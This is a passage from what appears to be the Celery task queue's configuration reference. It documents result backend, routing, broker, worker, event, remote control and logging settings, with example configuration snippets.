the DynamoDB Naming Rules for information on the allowed characters and length.\n\nread & write\n\nThe Read & Write Capacity Units for the created DynamoDB table. Default is 1 for both read and write. More details can be found in the Provisioned Throughput documentation.\n\nttl_seconds\n\nTime-to-live (in seconds) for results before they expire. The default is to not expire results, while also leaving the DynamoDB table’s Time to Live settings untouched. If ttl_seconds is set to a positive value, results will expire after the specified number of seconds. Setting ttl_seconds to a negative value means to not expire results, and also to actively disable the DynamoDB table’s Time to Live setting. Note that trying to change a table’s Time to Live setting multiple times in quick succession will cause a throttling error. More details can be found in the DynamoDB TTL documentation\n\nIronCache backend settings\n\nNote\n\nThe IronCache backend requires the https://pypi.org/project/iron_celery/ library:\n\nTo install this package use pip:\n\n$ pip install iron_celery\n\n\nIronCache is configured via the URL provided in result_backend, for example:\n\nresult_backend = 'ironcache://project_id:token@'\n\n\nOr to change the cache name:\n\nironcache:://project_id:token@/awesomecache\n\n\nFor more information, see: https://github.com/iron-io/iron_celery\n\nCouchbase backend settings\n\nNote\n\nThe Couchbase backend requires the https://pypi.org/project/couchbase/ library.\n\nTo install this package use pip:\n\n$ pip install celery[couchbase]\n\n\nSee Bundles for instructions how to combine multiple extension requirements.\n\nThis backend can be configured via the result_backend set to a Couchbase URL:\n\nresult_backend = 'couchbase://username:password@host:port/bucket'\n\ncouchbase_backend_settings\n\nDefault: {} (empty mapping).\n\nThis is a dict supporting the following keys:\n\nhost\n\nHost name of the Couchbase server. Defaults to localhost.\n\nport\n\nThe port the Couchbase server is listening to. Defaults to 8091.\n\nbucket\n\nThe default bucket the Couchbase server is writing to. Defaults to default.\n\nusername\n\nUser name to authenticate to the Couchbase server as (optional).\n\npassword\n\nPassword to authenticate to the Couchbase server (optional).\n\nArangoDB backend settings\n\nNote\n\nThe ArangoDB backend requires the https://pypi.org/project/pyArango/ library.\n\nTo install this package use pip:\n\n$ pip install celery[arangodb]\n\n\nSee Bundles for instructions how to combine multiple extension requirements.\n\nThis backend can be configured via the result_backend set to a ArangoDB URL:\n\nresult_backend = 'arangodb://username:password@host:port/database/collection'\n\narangodb_backend_settings\n\nDefault: {} (empty mapping).\n\nThis is a dict supporting the following keys:\n\nhost\n\nHost name of the ArangoDB server. Defaults to localhost.\n\nport\n\nThe port the ArangoDB server is listening to. Defaults to 8529.\n\ndatabase\n\nThe default database in the ArangoDB server is writing to. Defaults to celery.\n\ncollection\n\nThe default collection in the ArangoDB servers database is writing to. Defaults to celery.\n\nusername\n\nUser name to authenticate to the ArangoDB server as (optional).\n\npassword\n\nPassword to authenticate to the ArangoDB server (optional).\n\nhttp_protocol\n\nHTTP Protocol in ArangoDB server connection. Defaults to http.\n\nverify\n\nHTTPS Verification check while creating the ArangoDB connection. Defaults to False.\n\nCosmosDB backend settings (experimental)\n\nTo use CosmosDB as the result backend, you simply need to configure the result_backend setting with the correct URL.\n\nExample configuration\nresult_backend = 'cosmosdbsql://:{InsertAccountPrimaryKeyHere}@{InsertAccountNameHere}.documents.azure.com'\n\ncosmosdbsql_database_name\n\nDefault: celerydb.\n\nThe name for the database in which to store the results.\n\ncosmosdbsql_collection_name\n\nDefault: celerycol.\n\nThe name of the collection in which to store the results.\n\ncosmosdbsql_consistency_level\n\nDefault: Session.\n\nRepresents the consistency levels supported for Azure Cosmos DB client operations.\n\nConsistency levels by order of strength are: Strong, BoundedStaleness, Session, ConsistentPrefix and Eventual.\n\ncosmosdbsql_max_retry_attempts\n\nDefault: 9.\n\nMaximum number of retries to be performed for a request.\n\ncosmosdbsql_max_retry_wait_time\n\nDefault: 30.\n\nMaximum wait time in seconds to wait for a request while the retries are happening.\n\nCouchDB backend settings\n\nNote\n\nThe CouchDB backend requires the https://pypi.org/project/pycouchdb/ library:\n\nTo install this Couchbase package use pip:\n\n$ pip install celery[couchdb]\n\n\nSee Bundles for information on combining multiple extension requirements.\n\nThis backend can be configured via the result_backend set to a CouchDB URL:\n\nresult_backend = 'couchdb://username:password@host:port/container'\n\n\nThe URL is formed out of the following parts:\n\nusername\n\nUser name to authenticate to the CouchDB server as (optional).\n\npassword\n\nPassword to authenticate to the CouchDB server (optional).\n\nhost\n\nHost name of the CouchDB server. Defaults to localhost.\n\nport\n\nThe port the CouchDB server is listening to. Defaults to 8091.\n\ncontainer\n\nThe default container the CouchDB server is writing to. Defaults to default.\n\nFile-system backend settings\n\nThis backend can be configured using a file URL, for example:\n\nCELERY_RESULT_BACKEND = 'file:///var/celery/results'\n\n\nThe configured directory needs to be shared and writable by all servers using the backend.\n\nIf you’re trying Celery on a single system you can simply use the backend without any further configuration. For larger clusters you could use NFS, GlusterFS, CIFS, HDFS (using FUSE), or any other file-system.\n\nConsul K/V store backend settings\n\nNote\n\nThe Consul backend requires the https://pypi.org/project/python-consul2/ library:\n\nTo install this package use pip:\n\n$ pip install python-consul2\n\n\nThe Consul backend can be configured using a URL, for example:\n\nCELERY_RESULT_BACKEND = 'consul://localhost:8500/'\n\n\nor:\n\nresult_backend = 'consul://localhost:8500/'\n\n\nThe backend will store results in the K/V store of Consul as individual keys. The backend supports auto expire of results using TTLs in Consul. The full syntax of the URL is:\n\nconsul://host:port[?one_client=1]\n\n\nThe URL is formed out of the following parts:\n\nhost\n\nHost name of the Consul server.\n\nport\n\nThe port the Consul server is listening to.\n\none_client\n\nBy default, for correctness, the backend uses a separate client connection per operation. In cases of extreme load, the rate of creation of new connections can cause HTTP 429 “too many connections” error responses from the Consul server when under load. The recommended way to handle this is to enable retries in python-consul2 using the patch at https://github.com/poppyred/python-consul2/pull/31.\n\nAlternatively, if one_client is set, a single client connection will be used for all operations instead. This should eliminate the HTTP 429 errors, but the storage of results in the backend can become unreliable.\n\nMessage Routing\ntask_queues\n\nDefault: None (queue taken from default queue settings).\n\nMost users will not want to specify this setting and should rather use the automatic routing facilities.\n\nIf you really want to configure advanced routing, this setting should be a list of kombu.Queue objects the worker will consume from.\n\nNote that workers can be overridden this setting via the -Q option, or individual queues from this list (by name) can be excluded using the -X option.\n\nAlso see Basics for more information.\n\nThe default is a queue/exchange/binding key of celery, with exchange type direct.\n\nSee also task_routes\n\ntask_routes\n\nDefault: None.\n\nA list of routers, or a single router used to route tasks to queues. When deciding the final destination of a task the routers are consulted in order.\n\nA router can be specified as either:\n\nA function with the signature (name, args, kwargs, options, task=None, **kwargs)\n\nA string providing the path to a router function.\n\nA dict containing router specification:\n\nWill be converted to a celery.routes.MapRoute instance.\n\nA list of (pattern, route) tuples:\n\nWill be converted to a celery.routes.MapRoute instance.\n\nExamples:\n\ntask_routes = {\n    'celery.ping': 'default',\n    'mytasks.add': 'cpu-bound',\n    'feed.tasks.*': 'feeds',                           # <-- glob pattern\n    re.compile(r'(image|video)\\.tasks\\..*'): 'media',  # <-- regex\n    'video.encode': {\n        'queue': 'video',\n        'exchange': 'media',\n        'routing_key': 'media.video.encode',\n    },\n}\n\ntask_routes = ('myapp.tasks.route_task', {'celery.ping': 'default'})\n\n\nWhere myapp.tasks.route_task could be:\n\ndef route_task(self, name, args, kwargs, options, task=None, **kw):\n    if task == 'celery.ping':\n        return {'queue': 'default'}\n\n\nroute_task may return a string or a dict. A string then means it’s a queue name in task_queues, a dict means it’s a custom route.\n\nWhen sending tasks, the routers are consulted in order. The first router that doesn’t return None is the route to use. The message options is then merged with the found route settings, where the task’s settings have priority.\n\nExample if apply_async() has these arguments:\n\nTask.apply_async(immediate=False, exchange='video',\n                 routing_key='video.compress')\n\n\nand a router returns:\n\n{'immediate': True, 'exchange': 'urgent'}\n\n\nthe final message options will be:\n\nimmediate=False, exchange='video', routing_key='video.compress'\n\n\n(and any default message options defined in the Task class)\n\nValues defined in task_routes have precedence over values defined in task_queues when merging the two.\n\nWith the follow settings:\n\ntask_queues = {\n    'cpubound': {\n        'exchange': 'cpubound',\n        'routing_key': 'cpubound',\n    },\n}\n\ntask_routes = {\n    'tasks.add': {\n        'queue': 'cpubound',\n        'routing_key': 'tasks.add',\n        'serializer': 'json',\n    },\n}\n\n\nThe final routing options for tasks.add will become:\n\n{'exchange': 'cpubound',\n 'routing_key': 'tasks.add',\n 'serializer': 'json'}\n\n\nSee Routers for more examples.\n\ntask_queue_max_priority\nbrokers:\n\nRabbitMQ\n\nDefault: None.\n\nSee RabbitMQ Message Priorities.\n\ntask_default_priority\nbrokers:\n\nRabbitMQ, Redis\n\nDefault: None.\n\nSee RabbitMQ Message Priorities.\n\ntask_inherit_parent_priority\nbrokers:\n\nRabbitMQ\n\nDefault: False.\n\nIf enabled, child tasks will inherit priority of the parent task.\n\n# The last task in chain will also have priority set to 5.\nchain = celery.chain(add.s(2) | add.s(2).set(priority=5) | add.s(3))\n\n\nPriority inheritance also works when calling child tasks from a parent task with delay or apply_async.\n\nSee RabbitMQ Message Priorities.\n\nworker_direct\n\nDefault: Disabled.\n\nThis option enables so that every worker has a dedicated queue, so that tasks can be routed to specific workers.\n\nThe queue name for each worker is automatically generated based on the worker hostname and a .dq suffix, using the C.dq2 exchange.\n\nFor example the queue name for the worker with node name w1@example.com becomes:\n\nw1@example.com.dq\n\n\nThen you can route the task to the worker by specifying the hostname as the routing key and the C.dq2 exchange:\n\ntask_routes = {\n    'tasks.add': {'exchange': 'C.dq2', 'routing_key': 'w1@example.com'}\n}\n\ntask_create_missing_queues\n\nDefault: Enabled.\n\nIf enabled (default), any queues specified that aren’t defined in task_queues will be automatically created. See Automatic routing.\n\ntask_create_missing_queue_type\n\nAdded in version 5.6.\n\nDefault: \"classic\"\n\nWhen Celery needs to declare a queue that doesn’t exist (i.e., when task_create_missing_queues is enabled), this setting defines what type of RabbitMQ queue to create.\n\n\"classic\" (default): declares a standard classic queue.\n\n\"quorum\": declares a RabbitMQ quorum queue (adds x-queue-type: quorum).\n\ntask_create_missing_queue_exchange_type\n\nAdded in version 5.6.\n\nDefault: None\n\nIf this option is None or the empty string (the default), Celery leaves the exchange exactly as returned by your app.amqp.Queues.autoexchange hook.\n\nYou can set this to a specific exchange type, such as \"direct\", \"topic\", or \"fanout\", to create the missing queue with that exchange type.\n\nCombine this setting with task_create_missing_queue_type = “quorum” to create quorum queues bound to a topic exchange, for example:\n\napp.conf.task_create_missing_queues=True\napp.conf.task_create_missing_queue_type=\"quorum\"\napp.conf.task_create_missing_queue_exchange_type=\"topic\"\n\n\nLike the queue-type setting above, this option does not affect queues that you define explicitly in task_queues; it applies only to queues created implicitly at runtime.\n\ntask_default_queue\n\nDefault: \"celery\".\n\nThe name of the default queue used by .apply_async if the message has no route or no custom queue has been specified.\n\nThis queue must be listed in task_queues. If task_queues isn’t specified then it’s automatically created containing one queue entry, where this name is used as the name of that queue.\n\nSee also\n\nChanging the name of the default queue\n\ntask_default_queue_type\n\nAdded in version 5.5.\n\nDefault: \"classic\".\n\nThis setting is used to allow changing the default queue type for the task_default_queue queue. The other viable option is \"quorum\" which is only supported by RabbitMQ and sets the queue type to quorum using the x-queue-type queue argument.\n\nIf the worker_detect_quorum_queues setting is enabled, the worker will automatically detect the queue type and disable the global QoS accordingly.\n\nWarning\n\nQuorum queues require confirm publish to be enabled. Use broker_transport_options to enable confirm publish by setting:\n\nbroker_transport_options = {\"confirm_publish\": True}\n\n\nFor more information, see RabbitMQ documentation.\n\ntask_default_exchange\n\nDefault: Uses the value set for task_default_queue.\n\nName of the default exchange to use when no custom exchange is specified for a key in the task_queues setting.\n\ntask_default_exchange_type\n\nDefault: \"direct\".\n\nDefault exchange type used when no custom exchange type is specified for a key in the task_queues setting.\n\ntask_default_routing_key\n\nDefault: Uses the value set for task_default_queue.\n\nThe default routing key used when no custom routing key is specified for a key in the task_queues setting.\n\ntask_default_delivery_mode\n\nDefault: \"persistent\".\n\nCan be transient (messages not written to disk) or persistent (written to disk).\n\nBroker Settings\nbroker_url\n\nDefault: \"amqp://\"\n\nDefault broker URL. This must be a URL in the form of:\n\ntransport://userid:password@hostname:port/virtual_host\n\n\nOnly the scheme part (transport://) is required, the rest is optional, and defaults to the specific transports default values.\n\nThe transport part is the broker implementation to use, and the default is amqp, (uses librabbitmq if installed or falls back to pyamqp). There are also other choices available, including; redis://, sqs://, and qpid://.\n\nThe scheme can also be a fully qualified path to your own transport implementation:\n\nbroker_url = 'proj.transports.MyTransport://localhost'\n\n\nMore than one broker URL, of the same transport, can also be specified. The broker URLs can be passed in as a single string that’s semicolon delimited:\n\nbroker_url = 'transport://userid:password@hostname:port//;transport://userid:password@hostname:port//'\n\n\nOr as a list:\n\nbroker_url = [\n    'transport://userid:password@localhost:port//',\n    'transport://userid:password@hostname:port//'\n]\n\n\nThe brokers will then be used in the broker_failover_strategy.\n\nSee Celery with SQS in the Kombu documentation for more information.\n\nbroker_read_url / broker_write_url\n\nDefault: Taken from broker_url.\n\nThese settings can be configured, instead of broker_url to specify different connection parameters for broker connections used for consuming and producing.\n\nExample:\n\nbroker_read_url = 'amqp://user:pass@broker.example.com:56721'\nbroker_write_url = 'amqp://user:pass@broker.example.com:56722'\n\n\nBoth options can also be specified as a list for failover alternates, see broker_url for more information.\n\nbroker_failover_strategy\n\nDefault: \"round-robin\".\n\nDefault failover strategy for the broker Connection object. If supplied, may map to a key in ‘kombu.connection.failover_strategies’, or be a reference to any method that yields a single item from a supplied list.\n\nExample:\n\n# Random failover strategy\ndef random_failover_strategy(servers):\n    it = list(servers)  # don't modify callers list\n    shuffle = random.shuffle\n    for _ in repeat(None):\n        shuffle(it)\n        yield it[0]\n\nbroker_failover_strategy = random_failover_strategy\n\nbroker_heartbeat\ntransports supported:\n\npyamqp\n\nDefault: 120.0 (negotiated by server).\n\nNote: This value is only used by the worker, clients do not use a heartbeat at the moment.\n\nIt’s not always possible to detect connection loss in a timely manner using TCP/IP alone, so AMQP defines something called heartbeats that’s is used both by the client and the broker to detect if a connection was closed.\n\nIf the heartbeat value is 10 seconds, then the heartbeat will be monitored at the interval specified by the broker_heartbeat_checkrate setting (by default this is set to double the rate of the heartbeat value, so for the 10 seconds, the heartbeat is checked every 5 seconds).\n\nbroker_heartbeat_checkrate\ntransports supported:\n\npyamqp\n\nDefault: 2.0.\n\nAt intervals the worker will monitor that the broker hasn’t missed too many heartbeats. The rate at which this is checked is calculated by dividing the broker_heartbeat value with this value, so if the heartbeat is 10.0 and the rate is the default 2.0, the check will be performed every 5 seconds (twice the heartbeat sending rate).\n\nbroker_use_ssl\ntransports supported:\n\npyamqp, redis\n\nDefault: Disabled.\n\nToggles SSL usage on broker connection and SSL settings.\n\nThe valid values for this option vary by transport.\n\npyamqp\n\nIf True the connection will use SSL with default SSL settings. If set to a dict, will configure SSL connection according to the specified policy. The format used is Python’s ssl.wrap_socket() options.\n\nNote that SSL socket is generally served on a separate port by the broker.\n\nExample providing a client cert and validating the server cert against a custom certificate authority:\n\nimport ssl\n\nbroker_use_ssl = {\n  'keyfile': '/var/ssl/private/worker-key.pem',\n  'certfile': '/var/ssl/amqp-server-cert.pem',\n  'ca_certs': '/var/ssl/myca.pem',\n  'cert_reqs': ssl.CERT_REQUIRED\n}\n\n\nAdded in version 5.1: Starting from Celery 5.1, py-amqp will always validate certificates received from the server and it is no longer required to manually set cert_reqs to ssl.CERT_REQUIRED.\n\nThe previous default, ssl.CERT_NONE is insecure and we its usage should be discouraged. If you’d like to revert to the previous insecure default set cert_reqs to ssl.CERT_NONE\n\nredis\n\nThe setting must be a dict with the following keys:\n\nssl_cert_reqs (required): one of the SSLContext.verify_mode values:\n\nssl.CERT_NONE\n\nssl.CERT_OPTIONAL\n\nssl.CERT_REQUIRED\n\nssl_ca_certs (optional): path to the CA certificate\n\nssl_certfile (optional): path to the client certificate\n\nssl_keyfile (optional): path to the client key\n\nbroker_pool_limit\n\nAdded in version 2.3.\n\nDefault: 10.\n\nThe maximum number of connections that can be open in the connection pool.\n\nThe pool is enabled by default since version 2.5, with a default limit of ten connections. This number can be tweaked depending on the number of threads/green-threads (eventlet/gevent) using a connection. For example running eventlet with 1000 greenlets that use a connection to the broker, contention can arise and you should consider increasing the limit.\n\nIf set to None or 0 the connection pool will be disabled and connections will be established and closed for every use.\n\nbroker_connection_timeout\n\nDefault: 4.0.\n\nThe default timeout in seconds before we give up establishing a connection to the AMQP server. This setting is disabled when using gevent.\n\nNote\n\nThe broker connection timeout only applies to a worker attempting to connect to the broker. It does not apply to producer sending a task, see broker_transport_options for how to provide a timeout for that situation.\n\nbroker_connection_retry\n\nDefault: Enabled.\n\nAutomatically try to re-establish the connection to the AMQP broker if lost after the initial connection is made.\n\nThe time between retries is increased for each retry, and is not exhausted before broker_connection_max_retries is exceeded.\n\nWarning\n\nThe broker_connection_retry configuration setting will no longer determine whether broker connection retries are made during startup in Celery 6.0 and above. If you wish to refrain from retrying connections on startup, you should set broker_connection_retry_on_startup to False instead.\n\nbroker_connection_retry_on_startup\n\nDefault: Enabled.\n\nAutomatically try to establish the connection to the AMQP broker on Celery startup if it is unavailable.\n\nThe time between retries is increased for each retry, and is not exhausted before broker_connection_max_retries is exceeded.\n\nbroker_connection_max_retries\n\nDefault: 100.\n\nMaximum number of retries before we give up re-establishing a connection to the AMQP broker.\n\nIf this is set to None, we’ll retry forever.\n\nbroker_channel_error_retry\n\nAdded in version 5.3.\n\nDefault: Disabled.\n\nAutomatically try to re-establish the connection to the AMQP broker if any invalid response has been returned.\n\nThe retry count and interval is the same as that of broker_connection_retry. Also, this option doesn’t work when broker_connection_retry is False.\n\nbroker_login_method\n\nDefault: \"AMQPLAIN\".\n\nSet custom amqp login method.\n\nbroker_native_delayed_delivery_queue_type\n\nAdded in version 5.5.\n\ntransports supported:\n\npyamqp\n\nDefault: \"quorum\".\n\nThis setting is used to allow changing the default queue type for the native delayed delivery queues. The other viable option is \"classic\" which is only supported by RabbitMQ and sets the queue type to classic using the x-queue-type queue argument.\n\nbroker_transport_options\n\nAdded in version 2.2.\n\nDefault: {} (empty mapping).\n\nA dict of additional options passed to the underlying transport.\n\nSee your transport user manual for supported options (if any).\n\nExample setting the visibility timeout (supported by Redis and SQS transports):\n\nbroker_transport_options = {'visibility_timeout': 18000}  # 5 hours\n\n\nExample setting the producer connection maximum number of retries (so producers won’t retry forever if the broker isn’t available at the first task execution):\n\nbroker_transport_options = {'max_retries': 5}\n\n\nExample enabling publisher confirms (supported by the pyamqp transport). Without this, messages can be silently dropped when the broker hits resource limits:\n\nbroker_transport_options = {'confirm_publish': True}\n\nWorker\nimports\n\nDefault: [] (empty list).\n\nA sequence of modules to import when the worker starts.\n\nThis is used to specify the task modules to import, but also to import signal handlers and additional remote control commands, etc.\n\nThe modules will be imported in the original order.\n\ninclude\n\nDefault: [] (empty list).\n\nExact same semantics as imports, but can be used as a means to have different import categories.\n\nThe modules in this setting are imported after the modules in imports.\n\nworker_deduplicate_successful_tasks\n\nAdded in version 5.1.\n\nDefault: False\n\nBefore each task execution, instruct the worker to check if this task is a duplicate message.\n\nDeduplication occurs only with tasks that have the same identifier, enabled late acknowledgment, were redelivered by the message broker and their state is SUCCESS in the result backend.\n\nTo avoid overflowing the result backend with queries, a local cache of successfully executed tasks is checked before querying the result backend in case the task was already successfully executed by the same worker that received the task.\n\nThis cache can be made persistent by setting the worker_state_db setting.\n\nIf the result backend is not persistent (the RPC backend, for example), this setting is ignored.\n\nworker_concurrency\n\nDefault: Number of CPU cores.\n\nThe number of concurrent worker processes/threads/green threads executing tasks.\n\nIf you’re doing mostly I/O you can have more processes, but if mostly CPU-bound, try to keep it close to the number of CPUs on your machine. If not set, the number of CPUs/cores on the host will be used.\n\nworker_prefetch_multiplier\n\nDefault: 4.\n\nHow many messages to prefetch at a time multiplied by the number of concurrent processes. The default is 4 (four messages for each process). The default setting is usually a good choice, however – if you have very long running tasks waiting in the queue and you have to start the workers, note that the first worker to start will receive four times the number of messages initially. Thus the tasks may not be fairly distributed to the workers.\n\nTo limit the broker to only deliver one message per process at a time, set worker_prefetch_multiplier to 1. Changing that setting to 0 will allow the worker to keep consuming as many messages as it wants.\n\nIf you need to completely disable broker prefetching while still using early acknowledgments, enable worker_disable_prefetch. When this option is enabled the worker only fetches a task from the broker when one of its processes is available.\n\nNote\n\nThis feature is currently only supported when using Redis as the broker.\n\nYou can also enable this via the --disable-prefetch command line flag.\n\nFor more on prefetching, read Prefetch Limits\n\nworker_eta_task_limit\n\nAdded in version 5.6.\n\nDefault: No limit (None).\n\nThe maximum number of ETA/countdown tasks that a worker can hold in memory at once. When this limit is reached, the worker will not receive new tasks from the broker until some of the existing ETA tasks are executed.\n\nThis setting helps prevent memory exhaustion when a queue contains a large number of tasks with ETA/countdown values, as these tasks are held in memory until their execution time. Without this limit, workers may fetch thousands of ETA tasks into memory, potentially causing out-of-memory issues.\n\nNote\n\nTasks with ETA/countdown aren’t affected by prefetch limits.\n\nworker_disable_prefetch\n\nAdded in version 5.6.\n\nDefault: False.\n\nWhen enabled, a worker will only consume messages from the broker when it has an available process to execute them. This disables prefetching while still using early acknowledgments, ensuring that tasks are fairly distributed between workers.\n\nNote\n\nThis feature is currently only supported when using Redis as the broker. Using this setting with other brokers will result in a warning and the setting will be ignored.\n\nworker_enable_prefetch_count_reduction\n\nAdded in version 5.4.\n\nDefault: Enabled.\n\nThe worker_enable_prefetch_count_reduction setting governs the restoration behavior of the prefetch count to its maximum allowable value following a connection loss to the message broker. By default, this setting is enabled.\n\nUpon a connection loss, Celery will attempt to reconnect to the broker automatically, provided the broker_connection_retry_on_startup or broker_connection_retry is not set to False. During the period of lost connection, the message broker does not keep track of the number of tasks already fetched. Therefore, to manage the task load effectively and prevent overloading, Celery reduces the prefetch count based on the number of tasks that are currently running.\n\nThe prefetch count is the number of messages that a worker will fetch from the broker at a time. The reduced prefetch count helps ensure that tasks are not fetched excessively during periods of reconnection.\n\nWith worker_enable_prefetch_count_reduction set to its default value (Enabled), the prefetch count will be gradually restored to its maximum allowed value each time a task that was running before the connection was lost is completed. This behavior helps maintain a balanced distribution of tasks among the workers while managing the load effectively.\n\nTo disable the reduction and restoration of the prefetch count to its maximum allowed value on reconnection, set worker_enable_prefetch_count_reduction to False. Disabling this setting might be useful in scenarios where a fixed prefetch count is desired to control the rate of task processing or manage the worker load, especially in environments with fluctuating connectivity.\n\nThe worker_enable_prefetch_count_reduction setting provides a way to control the restoration behavior of the prefetch count following a connection loss, aiding in maintaining a balanced task distribution and effective load management across the workers.\n\nworker_lost_wait\n\nDefault: 10.0 seconds.\n\nIn some cases a worker may be killed without proper cleanup, and the worker may have published a result before terminating. This value specifies how long we wait for any missing results before raising a WorkerLostError exception.\n\nworker_max_tasks_per_child\n\nMaximum number of tasks a pool worker process can execute before it’s replaced with a new one. Default is no limit.\n\nworker_max_memory_per_child\n\nDefault: No limit. Type: int (kilobytes)\n\nMaximum amount of resident memory, in kilobytes (1024 bytes), that may be consumed by a worker before it will be replaced by a new worker. If a single task causes a worker to exceed this limit, the task will be completed, and the worker will be replaced afterwards.\n\nExample:\n\nworker_max_memory_per_child = 12288  # 12 * 1024 = 12 MB\n\nworker_disable_rate_limits\n\nDefault: Disabled (rate limits enabled).\n\nDisable all rate limits, even if tasks has explicit rate limits set.\n\nworker_state_db\n\nDefault: None.\n\nName of the file used to stores persistent worker state (like revoked tasks). Can be a relative or absolute path, but be aware that the suffix .db may be appended to the file name (depending on Python version).\n\nCan also be set via the celery worker --statedb argument.\n\nworker_timer_precision\n\nDefault: 1.0 seconds.\n\nSet the maximum time in seconds that the ETA scheduler can sleep between rechecking the schedule.\n\nSetting this value to 1 second means the schedulers precision will be 1 second. If you need near millisecond precision you can set this to 0.1.\n\nworker_enable_remote_control\n\nDefault: Enabled by default.\n\nSpecify if remote control of the workers is enabled.\n\nworker_proc_alive_timeout\n\nDefault: 4.0.\n\nThe timeout in seconds (int/float) when waiting for a new worker process to start up.\n\nworker_cancel_long_running_tasks_on_connection_loss\n\nAdded in version 5.1.\n\nDefault: Disabled by default.\n\nKill all long-running tasks with late acknowledgment enabled on connection loss.\n\nTasks which have not been acknowledged before the connection loss cannot do so anymore since their channel is gone and the task is redelivered back to the queue. This is why tasks with late acknowledged enabled must be idempotent as they may be executed more than once. In this case, the task is being executed twice per connection loss (and sometimes in parallel in other workers).\n\nWhen turning this option on, those tasks which have not been completed are cancelled and their execution is terminated. Tasks which have completed in any way before the connection loss are recorded as such in the result backend as long as task_ignore_result is not enabled.\n\nWarning\n\nThis feature was introduced as a future breaking change. If it is turned off, Celery will emit a warning message.\n\nIn Celery 6.0, the worker_cancel_long_running_tasks_on_connection_loss will be set to True by default as the current behavior leads to more problems than it solves.\n\nworker_detect_quorum_queues\n\nAdded in version 5.5.\n\nDefault: Enabled.\n\nAutomatically detect if any of the queues in task_queues are quorum queues (including the task_default_queue) and disable the global QoS if any quorum queue is detected.\n\nworker_soft_shutdown_timeout\n\nAdded in version 5.5.\n\nDefault: 0.0.\n\nThe standard warm shutdown will wait for all tasks to finish before shutting down unless the cold shutdown is triggered. The soft shutdown will add a waiting time before the cold shutdown is initiated. This setting specifies how long the worker will wait before the cold shutdown is initiated and the worker is terminated.\n\nThis will apply also when the worker initiate cold shutdown without doing a warm shutdown first.\n\nIf the value is set to 0.0, the soft shutdown will be practically disabled. Regardless of the value, the soft shutdown will be disabled if there are no tasks running (unless worker_enable_soft_shutdown_on_idle is enabled).\n\nExperiment with this value to find the optimal time for your tasks to finish gracefully before the worker is terminated. Recommended values can be 10, 30, 60 seconds. Too high value can lead to a long waiting time before the worker is terminated and trigger a KILL signal to forcefully terminate the worker by the host system.\n\nworker_enable_soft_shutdown_on_idle\n\nAdded in version 5.5.\n\nDefault: False.\n\nIf the worker_soft_shutdown_timeout is set to a value greater than 0.0, the worker will skip the soft shutdown anyways if there are no tasks running. This setting will enable the soft shutdown even if there are no tasks running.\n\nTip\n\nWhen the worker received ETA tasks, but the ETA has not been reached yet, and a shutdown is initiated, the worker will skip the soft shutdown and initiate the cold shutdown immediately if there are no tasks running. This may lead to failure in re-queueing the ETA tasks during worker teardown. To mitigate this, enable this configuration to ensure the worker waits regadless, which gives enough time for a graceful shutdown and successful re-queueing of the ETA tasks.\n\nEvents\nworker_send_task_events\n\nDefault: Disabled by default.\n\nSend task-related events so that tasks can be monitored using tools like flower. Sets the default value for the workers -E argument.\n\ntask_send_sent_event\n\nAdded in version 2.2.\n\nDefault: Disabled by default.\n\nIf enabled, a task-sent event will be sent for every task so tasks can be tracked before they’re consumed by a worker.\n\nevent_queue_ttl\ntransports supported:\n\namqp\n\nDefault: 5.0 seconds.\n\nMessage expiry time in seconds (int/float) for when messages sent to a monitor clients event queue is deleted (x-message-ttl)\n\nFor example, if this value is set to 10 then a message delivered to this queue will be deleted after 10 seconds.\n\nevent_queue_expires\ntransports supported:\n\namqp\n\nDefault: 60.0 seconds.\n\nExpiry time in seconds (int/float) for when after a monitor clients event queue will be deleted (x-expires).\n\nevent_queue_durable\ntransports supported:\n\namqp\n\nAdded in version 5.6.\n\nDefault: False\n\nIf enabled, the event receiver’s queue will be marked as durable, meaning it will survive broker restarts.\n\nevent_queue_exclusive\ntransports supported:\n\namqp\n\nAdded in version 5.6.\n\nDefault: False\n\nIf enabled, the event queue will be exclusive to the current connection and automatically deleted when the connection closes.\n\nWarning\n\nYou cannot set both event_queue_durable and event_queue_exclusive to True at the same time. Celery will raise an ImproperlyConfigured error if both are set.\n\nevent_queue_prefix\n\nDefault: \"celeryev\".\n\nThe prefix to use for event receiver queue names.\n\nevent_exchange\n\nDefault: \"celeryev\".\n\nName of the event exchange.\n\nWarning\n\nThis option is in experimental stage, please use it with caution.\n\nevent_serializer\n\nDefault: \"json\".\n\nMessage serialization format used when sending event messages.\n\nSee also\n\nSerializers.\n\nevents_logfile\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional file path for celery events to log into (defaults to stdout).\n\nevents_pidfile\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional file path for celery events to create/store its PID file (default to no PID file created).\n\nevents_uid\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional user ID to use when events celery events drops its privileges (defaults to no UID change).\n\nevents_gid\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional group ID to use when celery events daemon drops its privileges (defaults to no GID change).\n\nevents_umask\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional umask to use when celery events creates files (log, pid…) when daemonizing.\n\nevents_executable\n\nAdded in version 5.4.\n\nDefault: None\n\nAn optional python executable path for celery events to use when deaemonizing (defaults to sys.executable).\n\nRemote Control Commands\n\nNote\n\nTo disable remote control commands see the worker_enable_remote_control setting.\n\ncontrol_queue_ttl\n\nDefault: 300.0\n\nTime in seconds, before a message in a remote control command queue will expire.\n\nIf using the default of 300 seconds, this means that if a remote control command is sent and no worker picks it up within 300 seconds, the command is discarded.\n\nThis setting also applies to remote control reply queues.\n\ncontrol_queue_expires\n\nDefault: 10.0\n\nTime in seconds, before an unused remote control command queue is deleted from the broker.\n\nThis setting also applies to remote control reply queues.\n\ncontrol_exchange\n\nDefault: \"celery\".\n\nName of the control command exchange.\n\nWarning\n\nThis option is in experimental stage, please use it with caution.\n\ncontrol_queue_durable\n\nDefault: False\n\nType: bool\n\nIf set to True, the control exchange and queue will be durable — they will survive broker restarts.\n\ncontrol_queue_exclusive\n\nDefault: False\n\nType: bool\n\nIf set to True, the control queue will be exclusive to a single connection. This is generally not recommended in distributed environments.\n\nWarning\n\nSetting both control_queue_durable and control_queue_exclusive to True is not supported and will raise an error.\n\nLogging\nworker_hijack_root_logger\n\nAdded in version 2.2.\n\nDefault: Enabled by default (hijack root logger).\n\nBy default any previously configured handlers on the root logger will be removed. If you want to customize your own logging handlers, then you can disable this behavior by setting worker_hijack_root_logger = False.\n\nNote\n\nLogging can also be customized by connecting to the celery.signals.setup_logging signal.\n\nworker_log_color\n\nDefault: Enabled if app is logging to a terminal.\n\nEnables/disables colors in logging output 